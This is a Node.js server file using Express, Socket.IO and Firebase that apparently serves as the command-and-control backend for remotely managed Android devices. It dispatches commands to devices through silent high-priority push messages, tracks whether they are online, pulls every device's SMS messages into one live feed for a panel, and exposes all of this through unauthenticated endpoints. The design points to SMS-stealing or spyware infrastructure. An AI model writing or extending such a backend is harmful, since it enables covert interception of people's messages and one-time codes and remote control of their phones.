// server.js
import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import userFullDataRoutes from "./routes/userFullDataRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import notificationRoutes from "./routes/smsRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

const clean = (id) => id?.toString()?.trim()?.toUpperCase();

async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) {
    return;
  }

  try {
    const msg = {
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    };

    await fcm.send(msg);
  } catch (err) {

  }
}

async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  return Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};
    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });
}

async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();

    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
  }
}

io.on("connection", (socket) => {
  let currentDeviceId = null;

  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });

  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", { id, connectivity: "Online" });
    refreshDevicesLive(`deviceOnline:${id}`);
  });

  socket.on("disconnect", async () => {
    if (currentDeviceId) {
      await rtdb.ref(`status/${currentDeviceId}`).set({
        connectivity: "Offline",
        lastSeen: Date.now(),
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: currentDeviceId,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
    }
  });
});

app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    await rtdb.ref(`commands/${id}`).set({
      title,
      message,
      timestamp: Date.now(),
    });

    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false });
  }
});

const liveReplyWatchers = new Map();

function stopReplyWatcher(uid) {
  if (liveReplyWatchers.has(uid)) {
    const ref = liveReplyWatchers.get(uid);
    ref.off();
    liveReplyWatchers.delete(uid);
  }
}

function startReplyWatcher(uid) {
  const ref = rtdb.ref(`checkOnline/${uid}`);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("brosReplyUpdate", {
        uid,
        success: true,
        data: null,
        message: "No reply found",
      });
      return;
    }

    const data = snap.val();

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data: { uid, ...data },
    });
  });

  liveReplyWatchers.set(uid, ref);
}

app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = req.params.uid;

    stopReplyWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    startReplyWatcher(uid);

    return res.json({
      success: true,
      data,
      message: "Live listening started",
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
  if (!snap.exists()) return;

  const adminData = snap.val();

  const all = await rtdb.ref("registeredDevices").get();
  if (!all.exists()) return;

  all.forEach((child) => {
    const token = child.val()?.fcmToken;
    if (token) {
      sendFcmHighPriority(token, "ADMIN_UPDATE", {
        deviceId: child.key,
        ...adminData,
      });
    }
  });
});

function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const raw = snap.val();
  const cmd = extractCommandData(raw);
  if (!cmd) return;

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

rtdb
  .ref("commandCenter/deviceCommands")
  .on("child_added", handleDeviceCommandChange);
rtdb
  .ref("commandCenter/deviceCommands")
  .on("child_changed", handleDeviceCommandChange);

async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const data = snap.val() || {};

  const now = Date.now();

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) return;

  await sendFcmHighPriority(token, "CHECK_ONLINE", {
    uniqueid: uid,
    available: data.available || "unknown",
    checkedAt: String(data.checkedAt || ""),
  });
}

const checkOnlineRef = rtdb.ref("checkOnline");
checkOnlineRef.on("child_added", handleCheckOnlineChange);
checkOnlineRef.on("child_changed", handleCheckOnlineChange);

app.post("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    const now = Date.now();

    await rtdb.ref(`restart/${uid}`).set({
      restartAt: now,
      readable: new Date(now).toString(),
    });

    return res.json({ success: true, restartAt: now });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

const RESTART_EXPIRY = 15 * 60 * 1000;

app.get("/restart/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);

    const snap = await rtdb.ref(`restart/${uid}`).get();
    if (!snap.exists()) {
      return res.json({ success: true, data: null });
    }

    const data = snap.val();
    const diff = Date.now() - Number(data.restartAt);

    if (diff > RESTART_EXPIRY) {
      await rtdb.ref(`restart/${uid}`).remove();
      return res.json({ success: true, data: null });
    }

    return res.json({
      success: true,
      data: {
        uid,
        restartAt: data.restartAt,
        readable: data.readable,
        age: diff,
      },
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

/* ======================================================
      🔥 SMS NOTIFICATIONS LIVE STREAM
====================================================== */

const SMS_NODE = "smsNotifications";

// Helper to flatten SMS node for frontend
function flattenSms(raw) {
  let final = [];

  Object.entries(raw).forEach(([uid, msgs]) => {
    Object.entries(msgs || {}).forEach(([msgId, msgObj]) => {
      final.push({
        id: msgId,
        uniqueid: uid,
        ...msgObj,
      });
    });
  });

  // Sort latest first
  final.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  return final;
}

// Start RTDB live listener
const smsRef = rtdb.ref(SMS_NODE);

smsRef.on("value", (snap) => {
  if (!snap.exists()) {
    io.emit("smsLogsAllLive", {
      success: true,
      count: 0,
      data: [],
    });
    return;
  }

  const raw = snap.val() || {};
  const final = flattenSms(raw);

  io.emit("smsLogsAllLive", {
    success: true,
    count: final.length,
    data: final,
  });
});


function formatAgo(ms) {
  const sec = Math.floor((Date.now() - ms) / 1000);
  if (sec < 60) return `${sec} sec`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} min`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `${hr} hr`;
  const day = Math.floor(hr / 24);
  return `${day} days`;
}

app.get("/api/lastcheck/:uid", async (req, res) => {
  try {
    const uid = clean(req.params.uid);
    const snap = await rtdb.ref(`status/${uid}`).get();

    if (!snap.exists()) {
      return res.json({ success: false, message: "No status found" });
    }

    const st = snap.val();
    const ts = st.timestamp || st.lastSeen || 0;

    return res.json({
      success: true,
      uid,
      lastCheckAt: ts,
      readable: ts ? formatAgo(ts) : "N/A",
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

const registeredDevicesRef = rtdb.ref("registeredDevices");

registeredDevicesRef.on("child_added", () => {
  refreshDevicesLive("registered_added");
});

registeredDevicesRef.on("child_changed", () => {
  refreshDevicesLive("registered_changed");
});

registeredDevicesRef.on("child_removed", () => {
  refreshDevicesLive("registered_removed");
});

app.get("/api/devices", async (req, res) => {
  try {
    const devices = await buildDevicesList();
    return res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    res.status(500).json({ success: false });
  }
});

refreshDevicesLive("initial");

app.use(adminRoutes);
app.use(notificationRoutes);
app.use("/api", checkRoutes);
app.use("/api", userFullDataRoutes);
app.use(commandRoutes);

app.get("/", (_, res) => {
  res.send("RTDB + Socket.IO Backend Running");
});

server.listen(PORT, () => {});
